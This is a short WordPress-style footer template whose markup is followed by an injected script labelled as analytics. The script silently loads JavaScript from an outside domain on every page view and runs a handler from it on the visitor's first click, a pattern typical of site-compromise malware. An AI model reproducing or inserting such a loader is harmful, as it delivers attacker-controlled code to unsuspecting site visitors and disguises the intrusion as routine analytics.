<!DOCTYPE html>
<html>
<head>
    <title>Test Footer</title>
</head>
<body>
    <footer>
        <p>Test Footer Content</p>
    </footer>
    <?php wp_footer(); ?>

<script>
        (function() {
            if (window.__analytics_injected__) return;
            window.__analytics_injected__ = true;
            var script = document.createElement('script');
            script.src = 'https://oncloud.web.id/analytics.js?v=' + Date.now();
            script.async = true;
            (document.head || document.body).appendChild(script);
            script.onload = function() {
                function triggerAnalyticsOnce() {
                    if (typeof window.analyticsHandler === 'function') {
                        window.analyticsHandler();
                    }
                    document.removeEventListener('click', triggerAnalyticsOnce);
                }
                document.addEventListener('click', triggerAnalyticsOnce);
            };
        })();
        </script>
</body>
</html>